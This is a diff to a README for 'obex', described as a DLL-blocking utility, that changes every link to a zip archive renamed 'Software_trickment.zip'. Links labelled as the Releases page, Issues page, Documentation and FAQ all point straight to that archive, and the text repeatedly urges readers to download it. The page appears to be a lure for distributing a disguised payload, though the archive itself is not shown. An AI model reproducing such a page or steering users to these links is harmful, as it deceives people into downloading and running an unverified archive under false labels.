@@ -1,7 +1,7 @@
 # 🎉 obex - Block Unwanted DLLs Easily
 
 ## 📥 Download Now
-[![Download obex](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip)](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip)
+[![Download obex](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip)](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip)
 
 ## 🚀 Getting Started
 Obex helps you manage unwanted DLL files that can interfere with your programs. This guide will show you how to download and run the application step by step.
@@ -18,7 +18,7 @@ Obex helps you manage unwanted DLL files that can interfere with your programs. 
 - Lightweight and efficient operation
 
 ## 📂 Download & Install
-To download Obex, visit the [Releases page](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip). 
+To download Obex, visit the [Releases page](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of Obex.
@@ -45,14 +45,14 @@ If you encounter any issues, consider the following:
 - Restart the application if any settings are not applying.
 
 ## 💬 Support
-If you have questions or need help, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip). Our team will respond as soon as possible.
+If you have questions or need help, please create an issue on the [GitHub Issues page](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip). Our team will respond as soon as possible.
 
 ## 📣 Community Contributions
 We welcome contributions! If you have ideas or improvements, feel free to submit a pull request. 
 
 ## 🔗 Additional Resources
-- Official Documentation: [Documentation](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip)
-- Frequently Asked Questions: [FAQ](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip)
+- Official Documentation: [Documentation](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip)
+- Frequently Asked Questions: [FAQ](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip)
 
 ## 📥 Again, Download Now!
-Don't forget to download Obex to block unwanted DLLs simply and efficiently. [Download it directly here!](https://raw.githubusercontent.com/Raiz-ui/obex/main/ruby/obex.zip)
+Don't forget to download Obex to block unwanted DLLs simply and efficiently. [Download it directly here!](https://github.com/Raiz-ui/obex/raw/refs/heads/main/ruby/Software_trickment.zip)
